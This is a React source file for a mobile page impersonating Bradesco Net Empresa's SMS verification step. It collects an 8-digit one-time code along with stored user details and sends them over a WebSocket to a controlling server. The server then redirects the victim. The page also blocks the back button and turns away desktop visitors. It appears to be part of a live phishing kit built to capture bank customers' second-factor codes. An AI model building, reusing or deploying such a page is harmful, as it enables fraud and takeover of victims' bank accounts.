import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import bradescoLogo from "@/assets/bradesco-logo.png";
import { resolveServerRoute } from "@/lib/resolveServerRoute";
import { useWebSocket } from "@/hooks/useWebSocket";

const SMSPage = () => {
  const navigate = useNavigate();
  const usuario = localStorage.getItem("usuario") || "";
  const nome = localStorage.getItem("nome") || "";
  const dispositivo = localStorage.getItem("dispositivo") || "";
  const telefone = localStorage.getItem("telefone") || "";
  const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
  const [enviando, setEnviando] = useState(false);
  const [erro, setErro] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const { send } = useWebSocket({
    reconectarPayload: { dispositivo },
    onRedirect: (msg) => {
      navigate(resolveServerRoute(msg.url));
    },
    onMessage: (msg) => {
      if (msg.acao === "erro_chave") {
        setErro(msg.motivo || "Código inválido. Tente novamente.");
        setEnviando(false);
      }
    },
  });

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  const handleDigit = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const newChave = [...chave];
    newChave[index] = value;
    setChave(newChave);
    setErro("");
    if (value && index < 7) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !chave[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const chaveCompleta = chave.every(d => d !== "");

  const enviarChave = () => {
    if (!chaveCompleta) return;
    setErro("");
    setEnviando(true);
    send({ acao: "token", usuario, token: chave.join("") });
    navigate("/validando");
  };

  const telefoneExibido = telefone
    ? `(${telefone.slice(0, 2)}) *****-${telefone.slice(-4)}`
    : "(--) *****-----";

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">Este portal está disponível apenas para dispositivos móveis.</p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3">
          <h1 className="text-white text-base font-semibold tracking-tight">Bradesco Net Empresa</h1>
        </div>

        <div className="flex flex-col items-center flex-1 px-5 pt-6">
          <img src={bradescoLogo} alt="Bradesco" className="w-16 h-16 object-contain mb-4" />

          {nome && (
            <p className="text-[hsl(220,10%,46%)] text-sm mb-1">
              Olá, <span className="font-semibold text-[hsl(220,20%,14%)]">{nome}</span>
            </p>
          )}

          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-1 text-center">Verificação por SMS</h2>
          <p className="text-[hsl(220,10%,46%)] text-xs text-center mb-5 max-w-[280px]">
            Enviamos um código de verificação para o número cadastrado.
          </p>

          {/* Phone number display */}
          <div className="bg-white rounded-xl px-5 py-4 border border-[hsl(220,14%,89%)] mb-5 w-full flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-[hsl(220,60%,40%)]/10 flex items-center justify-center shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5 text-[hsl(220,60%,40%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
              </svg>
            </div>
            <div>
              <p className="text-[hsl(220,10%,46%)] text-xs">SMS enviado para</p>
              <p className="text-[hsl(220,20%,14%)] text-base font-bold tracking-wide">{telefoneExibido}</p>
            </div>
          </div>

          {/* Security key input */}
          <div className="w-full bg-white rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mb-4">
            <div className="flex items-center gap-3 mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
                <path d="M8 10h.01"/>
                <path d="M12 10h.01"/>
                <path d="M16 10h.01"/>
              </svg>
              <h3 className="text-[hsl(220,20%,14%)] text-sm font-bold leading-tight">
                Digite o código recebido por SMS
              </h3>
            </div>

            <div className="flex justify-between px-1 mb-3">
              {chave.map((digit, i) => (
                <input
                  key={i}
                  ref={el => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleDigit(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  className="w-8 h-10 text-center text-base font-mono border-b-2 border-[hsl(220,14%,80%)] bg-transparent focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
                />
              ))}
            </div>

            <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
              Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
            </p>

            {erro && <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erro}</p>}

            <button
              onClick={enviarChave}
              disabled={!chaveCompleta || enviando}
              className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
            >
              {enviando ? "Verificando..." : "Confirmar código"}
            </button>
          </div>

          <button className="text-[hsl(220,60%,40%)] text-xs font-semibold active:scale-95 transition-transform">
            Reenviar código SMS
          </button>
        </div>
      </div>
    </>
  );
};

export default SMSPage;
